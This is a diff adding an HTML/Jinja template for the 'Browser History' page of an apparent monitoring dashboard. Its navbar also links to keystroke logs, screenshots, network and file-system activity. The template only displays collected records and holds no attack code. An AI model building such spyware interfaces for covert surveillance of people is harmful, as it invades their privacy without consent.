@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Browser History</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 0; margin: 0; background: #1a1a2e; color: #e0e0e0; }
+        .navbar { background-color: #16213e; padding: 15px 20px; border-bottom: 1px solid #0f3460; display: flex; justify-content: space-between; align-items: center; }
+        .navbar a { color: #e0e0e0; text-decoration: none; margin-right: 25px; font-size: 1.1em; transition: color 0.3s ease; }
+        .navbar a:hover { color: #e94560; }
+        .container { padding: 30px; }
+        h1 { color: #e94560; margin-bottom: 25px; text-align: center; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background-color: #0f3460; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
+        th, td { padding: 12px 15px; border-bottom: 1px solid #1a1a2e; text-align: left; }
+        th { background-color: #16213e; color: #e0e0e0; font-weight: bold; }
+        tr:nth-child(even) { background-color: #1a1a2e; }
+        tr:hover { background-color: #2a3a5a; }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div>
+            <a href="/">Keystroke Log</a>
+            <a href="/network">Network Log</a>
+            <a href="/screenshots">Screenshots</a>
+            <a href="/browser">Browser History</a>
+            <a href="/filesystem">File System Activity</a>
+        </div>
+    </div>
+    <div class="container">
+        <h1>Browser History</h1>
+        <table>
+            <thead>
+                <tr>
+                    <th>Timestamp</th>
+                    <th>Source</th>
+                    <th>Title</th>
+                    <th>URL</th>
+                    <th>Visit Count / Size</th>
+                    <th>Last Visit Time</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for row in records %}
+                <tr>
+                    <td>{{ row.timestamp }}</td>
+                    <td>{{ row.source }}</td>
+                    <td>{{ row.title }}</td>
+                    <td><a href="{{ row.url }}" target="_blank">{{ row.url }}</a></td>
+                    <td>{{ row.visit_count }}</td>
+                    <td>{{ row.last_visit_time }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+</body>
+</html>
